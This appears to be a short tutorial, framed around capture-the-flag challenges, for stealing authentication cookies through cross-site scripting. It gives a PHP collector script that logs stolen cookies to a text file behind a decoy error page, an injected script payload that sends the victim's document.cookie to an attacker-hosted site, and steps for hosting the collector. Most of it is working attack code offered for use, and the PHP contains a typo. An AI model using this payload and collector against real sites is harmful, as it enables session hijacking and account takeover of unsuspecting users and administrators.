Programme to steal Auth cookies in CTFs Challenges:-

OVERVIEW-
__________________________________________________________________________________________________________________________________________________

Here, I made a simple php script and JavaScript thet steal cookies from admin/victum.
I learned this technique when i was playing google ctf Although i was not qualified into finals but i learned a lot.

so,
here we have a php script "cookietry.php" and two txt file "getcookies.txt" "malicious_code.txt" 

Requirement to perform this Attack:-
1.) A free webhosting site like (000webhost)
2.) Some technical knowledge

First, we need to host "cookietry.php" and "getcookies.txt" into some free hosting site.
then,note down address of your website.

Now let's see how this technique works.

NOTE:-This technique will only work if website have xss vulnerability(Which happens in most CTFs)

Attacker inject malicious javascript code into website and when someone/admin visited their link he/she automatically redirected to attacker website 
and their cookies get stolen.
which is easily accessible by attacker in "getcookies.txt"

Here comes Technical Parts
__________________________________________________________________________________________________________________________________________________

working of php code:-

<?php
if (isset($_GET['cookie']))
{
	$file = 'getcookies.txt';
	file_put_contents($file,$_GET['cookie'].PHP_EQL, FILE_APPEND);	
}
?>
<!DOCTYPE.html>
<html>
<title>ERROE 404-Problem found</title>
<body>
<h1 align="center"> oh No! Something went Wrong</h1>
</body>
</html>

I simply using GET request to capture cookies and store into "getcookies.txt" file.(Nothing Fancy)
and at last part of this code we display an error message "oh No! Something went Wrong" to avoid being suspecious.

at last that javascript malicious code that we execute into website

<script>window.location='https://your-website-address/cookietry.php?cookie='+escape(document.cookie)</script>
 
This code simply redirect victum/admin onto our sites and steal cookies.

That's it.(^_^)

This technique looks simple but become more powerfull when comes to right hand.(^_^)


